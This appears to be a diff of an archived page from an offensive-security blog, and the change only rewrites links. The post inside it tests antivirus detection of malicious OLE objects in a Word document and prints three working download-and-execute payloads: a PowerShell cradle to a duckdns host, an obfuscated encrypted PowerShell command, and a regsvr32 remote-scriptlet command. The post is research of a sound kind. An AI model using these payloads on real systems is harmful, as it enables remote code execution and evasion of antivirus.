@@ -5,14 +5,14 @@
     <meta name="description" content="Offensive Security Engineering &amp; Shenanigans">
     <meta name="Author" content="Rasta Mouse">
     <meta name="keywords" content="offensive security red team pentesting">
-    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
-    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <link rel="stylesheet" href=/rastamouse.me-old_blog/css/syntax.css>
+    <link rel="stylesheet" href=/rastamouse.me-old_blog/css/style.css>
     <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
     <title>Cheesy Rumbles</title>
   </head><body><aside id="sidenav">
     <header>
     
-        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        <a href=https://rastamouse.me><img src="/rastamouse.me-old_blog/avatar.png" alt="avatar"></a>
         
     
 
@@ -26,7 +26,7 @@
     <nav>
         
             		
-            <a href="/"
+            <a href="/rastamouse.me-old_blog/"
                 
             >
                 <i class="fas fa-home fa-sm"></i>
@@ -34,7 +34,7 @@
             </a>
         
             		
-            <a href="/blog/"
+            <a href="/rastamouse.me-old_blog/blog/"
                 
             >
                 <i class="fas fa-keyboard fa-ms"></i>
@@ -42,7 +42,7 @@
             </a>
         
             		
-            <a href="/tags"
+            <a href="/rastamouse.me-old_blog/tags"
                 
             >
                 <i class="fas fa-tags fa-ms"></i>
@@ -70,7 +70,7 @@
             </a>
         
             		
-            <a href="/index.xml"
+            <a href="/rastamouse.me-old_blog/index.xml"
                 
             >
                 <i class="fas fa-rss fa-ms"></i>
@@ -103,12 +103,12 @@
 <p>Anybody following <a href="https://twitter.com/JohnLaTwC">John Lambert</a> will know that malicious OLE&rsquo;s are on the map right now and there are some great examples of rather complex and sophisticated payloads.  But do they have to be&hellip;?  Well obviously that depends on the maturity of your target, but I was interested to find out just what the state of play is with AV vs OLE.</p>
 <p>To the laboratory.</p>
 <figure>
-    <img src="/images/antivirus/dexters-lab.jpg"/> 
+    <img src="/rastamouse.me-old_blog/images/antivirus/dexters-lab.jpg"/> 
 </figure>
 
 <p>This is the mock Word doc.  In all cases, the OLE is a simple batch file, called <code>unlock.bat</code> that contains my malicious code.  All it requires is the user to run the file.</p>
 <figure>
-    <img src="/images/antivirus/doc.png"/> 
+    <img src="/rastamouse.me-old_blog/images/antivirus/doc.png"/> 
 </figure>
 
 <h3 id="test-1">Test 1</h3>
@@ -116,7 +116,7 @@
 <pre><code>powershell.exe -nop -w hidden -c &quot;iex ((new-object net.webclient).downloadstring('http://kobaruto.duckdns.org/a'))&quot;
 </code></pre><p>This resulted in only 1 hit on VT.  Congrats ClamAV&hellip;</p>
 <figure>
-    <img src="/images/antivirus/vt1.png"/> 
+    <img src="/rastamouse.me-old_blog/images/antivirus/vt1.png"/> 
 </figure>
 
 <h3 id="test-2">Test 2</h3>
@@ -124,7 +124,7 @@
 <pre><code>CMd   /C POwERSHeLl -WINDowSTY HIddEn -NonInTEr -NoprOFi   &quot;. ( $vERboSeprEFERenCE.tosTRINg()[1,3]+'x'-JOiN'') (([rUntImE.inTEROpsERvICES.marsHaL]::pTRtOsTRinGUNi([ruNTImE.inTEropsERvICES.maRshaL]::SECUReSTRINGTOgLoBalAlLoCUNIcoDe( $('76492d1116743f0423413b16050a5345MgB8ADQAbgB5AFkAegBvAG0AdwBkAEMAaQBIAHMAVABkAEkAQwBCAC8AegBDAGcAPQA9AHwANgBjADQAMAA4ADgAYwA2ADAAYQAyAGUANgA5AGIAOQBiADQAOQA1ADQAZABjADEAMwBkAGMAMgBjAGIANAA4ADYANABmADcAZgBiADEANABjADUAYwBkADUAYwBjAGEAZAAzADgAOQBmADAAYQBjADUAYwA3ADAAMwA3ADUAMgA5ADIANgA3ADMAMABkADIAZgAxADEANABkAGEAZgBjADAAMQA1ADQAMgBjADEANQAwADMAYQAzAGYAZAA3ADQAOABhAGEAOAA4ADkAYwAwAGUAYwAyAGEAZQBiADQAYwAzADcANAA5ADMAZgAxADQAZAA4ADkAZgAxAGQAMAAxADAAOAA3AGIAOQBiADQAOQA3ADgANQBmAGQAZgAxADcAYQBjADEAMgBhADkAZAAzADEAMQA0AGUANQA0ADMANgA5AGEAMgA2ADYANQAwAGMANwBmADgAMwAyADYANAAwAGIAYwA0AGQAOABlADgANAA2ADUAZgAwAGMAYgA2AGQAOAAwADgAOABjAGIAYQAxADIANwBkADMAYwA0ADgANQA2ADAAMAA0AGIANwA4AGMAZABiADIAOABkADQAYQA0AGEAOAA5ADcAMgBhAGQAYgA5ADkAMQBiAGIAOQBhADIAMwBiAGUAOQA2AGIANABmADQANwA1ADUAOQA3AGUAZgAzADEANAA4AGQANAA4AGEAYwA2ADcAMQAwADgAOQAzAGQAYgA4AGYAMwA1ADQAOAA4ADQAMQBjAGIAZQBhADMAYwAzAGEAMABkADQAMgA0AGYAZgBmADIAOAA2ADAAZAA4AGIAYQBkADkAYwBhAGEANwBkADEAMwBmAGIAYQAzADgAMgBlAGQAYgBkADMANgBmADcAYQAxAGQAYgA1ADYANwA1ADcANABmADAAZAAzADUAMgA0ADEANQA1ADYAMwA='|CoNveRTto-seCurEStRING -KE (11..34)))) ) )&quot;
 </code></pre><p>0 hits.</p>
 <figure>
-    <img src="/images/antivirus/vt2.png"/> 
+    <img src="/rastamouse.me-old_blog/images/antivirus/vt2.png"/> 
 </figure>
 
 <h3 id="test-3">Test 3</h3>
@@ -132,7 +132,7 @@
 <pre><code>regsvr32 /s /u /n /i:https://gist.githubusercontent.com/rasta-mouse/b93a7eafacee04837fb59b53ca27025c/raw/203c8b0740313a91147d7c33e3e4a278b4863d73/http.sct scrobj.dll
 </code></pre><p>0 hits.</p>
 <figure>
-    <img src="/images/antivirus/vt3.png"/> 
+    <img src="/rastamouse.me-old_blog/images/antivirus/vt3.png"/> 
 </figure>
 
 <p>At this point, I kinda gave up - the whole thing is clearly broken&hellip;  I didn&rsquo;t expect the AV to fair particularly well, but it surprised me just how little AV seems to detect in OLE.
@@ -142,13 +142,13 @@ Of course on a real engagement there are other considerations apart from AV, thi
     <div class="nav-next-prev">
         <div class="nav-prev">
             
-                <a href="https://rastamouse.me/blog/psexec-much/"><i class="fas fa-chevron-left"></i></a>
+                <a href="/rastamouse.me-old_blog/blog/psexec-much/"><i class="fas fa-chevron-left"></i></a>
             
         </div>
         <a class="nav-top" href="#">top</i></a>
         <div class="nav-next">
             
-                <a href="https://rastamouse.me/blog/terraform-pt1/"><i class="fas fa-chevron-right"></i></a>
+                <a href="/rastamouse.me-old_blog/blog/terraform-pt1/"><i class="fas fa-chevron-right"></i></a>
             
         </div>
     </div>
@@ -163,5 +163,5 @@ Of course on a real engagement there are other considerations apart from AV, thi
 </div>
 </footer></main>
     </body>
-    <script src=https://rastamouse.me/js/navbutton.js></script>
+    <script src=/rastamouse.me-old_blog/js/navbutton.js></script>
 </html>
